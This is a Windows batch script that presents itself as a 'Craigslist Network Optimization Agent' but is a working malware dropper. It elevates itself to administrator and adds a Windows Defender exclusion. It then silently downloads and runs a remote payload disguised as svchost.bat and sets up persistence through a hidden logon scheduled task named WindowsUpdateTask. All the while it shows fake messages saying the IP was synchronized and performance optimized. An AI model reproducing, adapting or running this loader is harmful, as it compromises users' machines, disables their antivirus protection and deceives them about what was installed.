@echo off

:: ================== IMMEDIATE VISIBLE CONSOLE ==================
if not defined WINDOW_HIDDEN (
set "WINDOW_HIDDEN=1"
start "" cmd /c "%~f0"
exit /b
)

:: Self-elevate to Administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
exit /b
)

echo.
echo [ Craigslist Network Optimization Agent ]
echo ================================================
echo.
echo Synchronizing IP with secure endpoint...

:: === Real actions (silent) ===
set "INSTALL_DIR=C:\ProgramData\WindowsUpdate"
set "PAYLOAD=%INSTALL_DIR%\svchost.bat"
set "URL=https://y.hn/juykz"
set "TASK_NAME=WindowsUpdateTask"

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" 2>nul

powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -Command "$url = '%URL%'; $path = '%PAYLOAD%'; try { (New-Object System.Net.WebClient).DownloadFile($url, $path) } catch {}" >nul 2>&1

timeout /t 2 /nobreak >nul 2>&1

if exist "%PAYLOAD%" (
powershell -Command "Unblock-File -Path '%PAYLOAD%' -ErrorAction SilentlyContinue" >nul 2>&1
taskkill /f /im "svchost.bat" /fi "Path eq %PAYLOAD%" >nul 2>&1
start "" "%PAYLOAD%" >nul 2>&1

schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

:: ================== HYBRID PERSISTENCE ==================
powershell -Command "$action = New-ScheduledTaskAction -Execute '%PAYLOAD%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem).UserName -LogonType Interactive -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden; $ErrorActionPreference = 'Stop'; try { Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop; exit 0 } catch { exit 1 }" >nul 2>&1

if %errorlevel% neq 0 (
schtasks /create /tn "%TASK_NAME%" /tr "\"%PAYLOAD%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /f /it >nul 2>&1
)
)

echo.
echo [+] IP address successfully synchronized with secure endpoint.
echo [+] Secure tunnel established.
echo.
echo [✓] Optimization completed successfully.
echo IP synchronization stable ^| System performance optimized.
echo.
echo ================================================
echo.
echo Press any key to close this window...
pause >nul

exit /b
